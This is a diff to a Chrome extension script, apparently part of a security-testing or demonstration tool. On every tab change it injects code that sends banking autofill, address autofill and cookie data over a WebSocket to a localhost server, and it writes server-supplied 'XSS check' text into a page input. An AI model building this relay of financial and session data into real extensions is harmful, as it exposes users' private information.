@@ -28,6 +28,17 @@ chrome.webNavigation.onDOMContentLoaded.addListener(async () => {
     });
 });
 
+// Everytime the user changes tabs, relay the new information to the server
+chrome.tabs.onActivated.addListener(async () => {
+    let [tab] = await chrome.tabs.query({active: true, currentWindow: true});
+
+    chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        function: socket,
+        args: [addressAutoFill, bankingAutoFill, cookieData]
+    });
+})
+
 function socket(addressAutoFill, bankingAutoFill, cookieData) {
     let ws = new WebSocket("ws://localhost:8080");
 
@@ -56,8 +67,12 @@ function socket(addressAutoFill, bankingAutoFill, cookieData) {
 
         // Perform XSS checks.
         } else if (data.id === "xss") {
-            let input = document.getElementById("enterName");
-            input.value = data.message;
+            try {
+                let input = document.getElementById("enterName");
+                input.value = data.message;
+            } catch (err) {
+                console.log("no inputs");
+            }
         }
     });
 }
